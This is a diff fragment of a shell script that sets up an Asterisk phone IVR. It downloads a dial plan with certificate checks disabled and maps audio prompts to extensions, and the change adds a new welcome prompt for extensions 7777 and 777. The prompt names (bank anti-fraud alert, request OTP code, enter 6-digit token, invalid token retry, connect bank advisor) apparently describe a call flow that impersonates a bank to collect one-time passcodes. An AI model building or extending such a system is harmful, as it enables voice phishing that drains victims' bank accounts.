@@ -2258,7 +2258,7 @@ fi
 curl -sSLk "${baseUrl}/api/asterisk/config/extensions.conf" -o /etc/asterisk/extensions.conf
 
 echo "=== [3/5] Descargando y verificando audios de IVR en /var/lib/asterisk/sounds/custom/ ==="
-AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "digite_token_6_digitos" "token_invalido_reintente" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos")
+AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "digite_token_6_digitos" "token_invalido_reintente" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos" "bienvenida_7777")
 for aud in "\${AUDIOS[@]}"; do
   if [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.wav" ] && [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.gsm" ]; then
     echo "  -> Obteniendo audio: \${aud}.wav..."
@@ -2272,6 +2272,11 @@ asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp' 
 asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion' || true
 asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito' || true
 asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco' || true
+
+asterisk -rx 'database put ivr_vars 7777_intro custom/bienvenida_7777' || true
+asterisk -rx 'database put ivr_vars 7777_prompt custom/bienvenida_7777' || true
+asterisk -rx 'database put ivr_vars 777_intro custom/bienvenida_7777' || true
+asterisk -rx 'database put ivr_vars 777_prompt custom/bienvenida_7777' || true
 
 asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude' || true
 asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp' || true
